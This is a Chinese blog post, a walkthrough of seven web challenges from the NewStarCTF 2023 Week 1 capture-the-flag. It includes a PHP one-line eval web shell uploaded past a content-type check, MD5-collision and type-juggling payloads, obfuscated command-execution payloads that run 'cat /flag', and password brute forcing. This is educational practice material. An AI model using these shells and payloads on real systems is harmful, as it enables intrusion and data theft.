<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>2023NewStarCtf WEB [WEEK1] 超详细题目思路wp - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="2023NewStarCtf WEB [WEEK1] 超详细题目思路wp" />
<meta property="og:description" content="1、泄漏的秘密 扫描目录得到www.zip，下载到电脑后打开里面有index.php和robots.txt，点开得到两段flag，拼接得到完整flag
2、Begin of Upload 这里上传一句话木马，抓包后修改content-type:image/png绕过检测，这里使用的木马是
php phpinfo(); @eval($_POST[&#39;shell&#39;]); 这里看见php信息说明木马上传成功，用蚁剑链接flag在根目录下
3、Begin of HTTP 以闯关形式做题，最后抓包修改后的内容如下。
User-Agent：后面表示的是服务器
referer后面改为newstarctf.com，加上X-Forworded-For：127.0.0.1，把所有有网址的地方都改为127.0.0.1
4、ErrorFlask 简单测试了一下就在源码出现了flag
?number1=2&amp;number2=__class__ 5、Begin of PHP 题目如下
&lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_GET[&#39;key1&#39;]) &amp;&amp; isset($_GET[&#39;key2&#39;])){ echo &#34;=Level 1=&lt;br&gt;&#34;; if($_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;] &amp;&amp; md5($_GET[&#39;key1&#39;]) == md5($_GET[&#39;key2&#39;])){ $flag1 = True; }else{ die(&#34;nope,this is level 1&#34;); } } if($flag1){ echo &#34;=Level 2=&lt;br&gt;&#34;; if(isset($_POST[&#39;key3&#39;])){ if(md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;])){ $flag2 = True; } }else{ die(&#34;nope,this is level 2&#34;); } } if($flag2){ echo &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/ff4a5fc16a74881971c7bab2aef8f3b6/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-12T21:43:51+08:00" />
<meta property="article:modified_time" content="2023-10-12T21:43:51+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">2023NewStarCtf WEB [WEEK1] 超详细题目思路wp</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>1、泄漏的秘密</h2> 
<p>扫描目录得到www.zip，下载到电脑后打开里面有index.php和robots.txt，点开得到两段flag，拼接得到完整flag</p> 
<p style="text-align:center;"><img src="https://images2.imgbox.com/ba/44/lY3mqsIa_o.png" alt="bde4361d6fcc4fb2a54e878b60c6f00d.png"></p> 
<p style="text-align:center;"> </p> 
<h2 style="text-align:center;">2、Begin of Upload</h2> 
<p>这里上传一句话木马，抓包后修改content-type:image/png绕过检测，这里使用的木马是</p> 
<pre><code>php phpinfo(); @eval($_POST['shell']); </code></pre> 
<h3 style="text-align:center;"><img src="https://images2.imgbox.com/45/a8/XuUPBFoK_o.png" alt="ad430173af614ca9ab2f356c242a0afd.png"></h3> 
<p>这里看见php信息说明木马上传成功，用蚁剑链接flag在根目录下</p> 
<h2><img src="https://images2.imgbox.com/df/5d/4rKv327V_o.png" alt="cb181f7c4fa543c7be585d1fdc8e8f2b.png"></h2> 
<h2>3、Begin of HTTP</h2> 
<p>以闯关形式做题，最后抓包修改后的内容如下。</p> 
<p>User-Agent：后面表示的是服务器</p> 
<p>referer后面改为newstarctf.com，加上X-Forworded-For：127.0.0.1，把所有有网址的地方都改为127.0.0.1</p> 
<p><img src="https://images2.imgbox.com/ab/60/mtXsRa6t_o.png" alt="431fe723ede04225a22fb828ca8ee131.png"></p> 
<p> </p> 
<h2 style="text-align:center;">4、ErrorFlask</h2> 
<p>简单测试了一下就在源码出现了flag</p> 
<pre><code>?number1=2&amp;number2=__class__</code></pre> 
<p style="text-align:center;"><img src="https://images2.imgbox.com/60/23/MjguZcsa_o.png" alt="ddd59a6150694189bdb7a56b6f52282c.png"></p> 
<h2 style="text-align:center;">5、Begin of PHP</h2> 
<p>题目如下</p> 
<pre><code> &lt;?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) &amp;&amp; isset($_GET['key2'])){
    echo "=Level 1=&lt;br&gt;";
    if($_GET['key1'] !== $_GET['key2'] &amp;&amp; md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=&lt;br&gt;";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=&lt;br&gt;";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    echo "=Level 4=&lt;br&gt;";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) &amp;&amp; $_GET['key5'] &gt; 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=&lt;br&gt;";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
} </code></pre> 
<p><img src="https://images2.imgbox.com/e7/97/A0zTBWMO_o.png" alt="9e378a10c11a4e7185da80ca86747811.png"></p> 
<p style="margin-left:.0001pt;text-align:justify;">key1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p> 
<p style="margin-left:.0001pt;text-align:justify;">key2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p> 
<p style="margin-left:.0001pt;text-align:justify;">这是一对MD5值相同但是本身不相同的东西，或者这里用数组绕过也行key1[]=1&amp;key2[]=1</p> 
<p style="margin-left:.0001pt;text-align:justify;">!is_number确保传参的没有数字，这里要求传入的数大于2023但是不能输入数字，我们可以用%00截断绕过或者在2024后面加字母，比如2024%00,2024admin，php的弱比较也能用这种方式绕过</p> 
<p style="margin-left:.0001pt;text-align:justify;">完整payload：</p> 
<pre><code>key1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;key2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;key4[]=1&amp;key5=2024%00</code></pre> 
<p>最后个条件困了我挺久，以为是检测整个post请求体都不含字母数字，其实不是，最后两个都是空格，payload：</p> 
<pre><code>flag5= &amp;key3[]= </code></pre> 
<p>原理如下:</p> 
<p>先用extract把post方法传的数据提取成一个个参数，两个传的都是空格，哪怕给flag5传的是空格，服务器也是认为flag5存在的</p> 
<h2><br> 6、rce</h2> 
<p>php在接收参数的时候发现表单名有点号（.）或者空格( )的时候会自动把它们转化为下划线，e_v.a.l会变成e_v_a_l被服务器接受，自然无法命令执行。但是php会把表单名里的[自动转化为_</p> 
<p style="text-align:center;"><img src="https://images2.imgbox.com/7d/50/gmhclFax_o.png" alt="68ea3928933841838cc0f72502d61921.png"></p> 
<p>这里使用了取反绕过，得到system的编码后把system替换为cat /flag得到另一个编码，最后在这两个括号里分别填上编码，第一个括号填system的，第二个填cat /flag的(~)(~);</p> 
<pre><code>&lt;?php
$a=urlencode(~'system');
echo $a;
?&gt;</code></pre> 
<p style="text-align:center;"><img src="https://images2.imgbox.com/94/20/5S378Emh_o.png" alt="a6a30319844245be9bdb7d5b58d737d8.png"></p> 
<p style="text-align:center;">payload：</p> 
<pre><code>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></pre> 
<p> 当然也可以使用简单的模糊绕过比如：</p> 
<blockquote> 
 <p>e[v.a.l=echo `ta? /fl*`;</p> 
</blockquote> 
<h2>7、login</h2> 
<p>用brupsuite爆破admin的密码得到密码000000</p> 
<p>登录后进入一个交互界面，其实在这个时候翻一下历史包搜flag关键词就能找到flag</p> 
<p><img src="https://images2.imgbox.com/83/8e/w6l8FtG2_o.png" alt="812bd8b8af83a7da56496fd6524b24e8.png"></p> 
<p>如有错误欢迎指出</p> 
<p> </p> 
<p> </p> 
<p> </p> 
<p> </p> 
<p> </p> 
<p> </p> 
<p> </p> 
<p> </p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/e33a6b12786c214d8302745d00157516/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">ubuntu20.04 nerf Instant-ngp (下) 复现，自建数据集，导出mesh</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/ff8a08f6a8454b4a47af7706f3bd7303/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【C&#43;&#43;】类模板（一）被参数化的类型、类模板的定义、模板类型参数的处理</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>